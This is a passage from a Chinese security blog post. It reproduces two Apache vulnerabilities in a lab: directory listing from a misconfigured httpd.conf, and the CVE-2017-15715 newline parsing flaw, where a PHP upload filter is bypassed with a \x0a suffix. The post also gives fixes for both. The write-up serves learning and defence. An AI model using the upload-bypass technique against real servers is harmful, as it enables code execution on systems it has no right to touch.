</li>
<li><p>把配置不当的文件进行修改</p>
</li>
</ol>
<h2 id="目录遍历漏洞"><a href="#目录遍历漏洞" class="headerlink" title="目录遍历漏洞"></a>目录遍历漏洞</h2><p><strong>原理</strong></p>
<p>当客户端访问到一个目录时，Apache服务器将会默认寻找一个index list中的文件，若文件不存在，则会列出当前目录下所有文件或返回403状态码，而列出目录下所有文件的行为称为目录遍历。</p>
<h3 id="复现-9"><a href="#复现-9" class="headerlink" title="复现"></a>复现</h3><p>由于配置文件http.conf设置不当，造成漏洞</p>
<img src="/2022/05/10/22-0510-01/image-20220514221022919.png" alt="image-20220514221022919" style="zoom:80%;">

<p>可以访问到admin文件夹下的文件</p>
<img src="/2022/05/10/22-0510-01/image-20220514220844796.png" alt="image-20220514220844796" style="zoom:80%;">

<h3 id="防御-9"><a href="#防御-9" class="headerlink" title="防御"></a>防御</h3><ol>
<li><p>在httpd.conf文件中找到Options + Indexes + FollowSymLinks + ExecCGI并修改成Options -Indexes + FollowSymLinks + ExecCGI并保存（把+修改为-）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">+ Indexes 允许目录浏览 </span><br><span class="line">— Indexes 禁止目录浏览</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="Apache-HTTPD-换行解析漏洞（CVE-2017-15715）"><a href="#Apache-HTTPD-换行解析漏洞（CVE-2017-15715）" class="headerlink" title="Apache HTTPD 换行解析漏洞（CVE-2017-15715）"></a>Apache HTTPD 换行解析漏洞（CVE-2017-15715）</h2><p>Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，1.php\x0a将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p>
<h3 id="复现-10"><a href="#复现-10" class="headerlink" title="复现"></a>复现</h3><p>复现采用vulhub环境进行复现</p>
<img src="/2022/05/10/22-0510-01/image-20220515142615104.png" alt="image-20220515142615104" style="zoom:80%;">

<p>

<img src="/2022/05/10/22-0510-01/image-20220515144112164.png" alt="image-20220515144112164" style="zoom:80%;">

</p><p>

</p><p>上传1.php（1.php里的内容为<code>&lt;?php phpinfo(); ?&gt;</code>），无法直接上传成功</p>
<img src="/2022/05/10/22-0510-01/image-20220515143358878.png" alt="image-20220515143358878" style="zoom:80%;">



<p>

<img src="/2022/05/10/22-0510-01/image-20220515144249485.png" alt="image-20220515144249485" style="zoom:80%;">

</p><p>

<img src="/2022/05/10/22-0510-01/image-20220515144355347.png" alt="image-20220515144355347" style="zoom:80%;">

</p><p>访问已经可以成功解析</p>
<img src="/2022/05/10/22-0510-01/image-20220515144933934.png" alt="image-20220515144933934" style="zoom:80%;">

<h3 id="防御-10"><a href="#防御-10" class="headerlink" title="防御"></a>防御</h3><ol>
<li>升级到最新版本</li>
<li>将上传的文件重命名为为时间戳+随机数+.jpg的格式并禁用上传文件目录执行</li>
</ol>
<h1 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h1><h1 id="tomcat"><a href="#tomcat" class="headerlink" title="tomcat"></a>tomcat</h1><h1 id="jboss"><a href="#jboss" class="headerlink" title="jboss"></a>jboss</h1><h1 id="weblogic"><a href="#weblogic" class="headerlink" title="weblogic"></a>weblogic</h1><h1 id="WebSphere"><a href="#WebSphere" class="headerlink" title="WebSphere"></a>WebSphere</h1>
        </div>		
		
        <section class="post-tags">
            <div>
                <span>标签:</span>
                <span class="tag">
                    
                </span>
            </div>
            <div>
                <a href="/">
                    <i class="iconfont icon-home"></i>
                    主页
                </a>
                <span>· </span>
                <a href="javascript:window.history.back();">
                    <i class="iconfont icon-back"></i>
                    返回
                </a>
                
                
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2022/05/12/22-0512-01/">MSF常用命令集合</a>
            
            
            <a class="next" rel="next" href="/2022/05/09/22-0509-01/">ATT&CK—红队评估1</a>
            
        </section>
        <br>
        
            <section id="comments" class="comments">
              <style>
                  .comments{ margin-top: 30px;}
                  .v .vlist .vcard .vcontent {padding-top: 0;}
                  .vcontent p { color:grey; margin-bottom: 10px;}
                  .v * {line-height: normal;}
                  .v .vwrap  {border-radius: 0px; padding: 10px;}
                  .v .vbtn {border-radius: 0px;}
                  .v code, .v pre {border-radius: 0px;}
                  .v .vlist .vcard .vhead .vsys {border-radius: 1px; padding: 2px;}
                  .v .vlist .vcard .vhead .vnick {color: #2d96bd;}
                  .v .vlist .vcard .vh .vmeta .vat{color: #c7254e;}
                  .v .vlist .vcard {padding-top: 0;}
                  .v .vlist .vcard .vimg { width: 2.5em; height: 2.5em; }
                  .v .vlist .vcard .vquote .vimg { width: 2.5em; height: 2.5em; }
              </style>
              <div class="valine_comment"></div>
<!--载入js，在</body>之前插入即可-->
<!--Leancloud 操作库:-->
<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<!--Valine 的核心代码库-->
<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
<script>
    new Valine({
        app_id: 'baahrwTTyOayDYUv5AtkdGJj-gzGzoHsz',
        app_key: 'iTfzn8X60g9v0zTtnvToc09l',
        placeholder: '想对作者说点什么...',
        notify: 'false',
        verify: 'false',
        avatar: 'retro',
        visitor: 'true'
    });
</script>
            </section>
        
    </article>
</div>



<style>

.post-wrap { table-layout:fixed; word-break:break-all; overflow:hidden; }

</style>
        </div>
        <footer id="footer" class="footer">

 <div class="copyright">

 <span>© 𝐴_𝑌𝑢

 <!-- 访客数量 -->

 

 <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<span class="site-uv">
    | 总访客量:
    <i class="busuanzi-value" id="busuanzi_value_site_uv"><i class="fa fa-spinner fa-spin"></i></i>
</span>&nbsp;


<span class="site-pv">
    | 总访问量:
    <i class="busuanzi-value" id="busuanzi_value_site_pv"><i class="fa fa-spinner fa-spin"></i></i>
</span>


 

 </span>

 </div>

</footer>
    </div>
</body>
</html>


	



<script type="text/javascript" src="\js\jquery.js"></script>
<script type="text/javascript" src="\js\jquery.min.js"></script>

<script  type="text/javascript" src="\js\snow.js"></script>

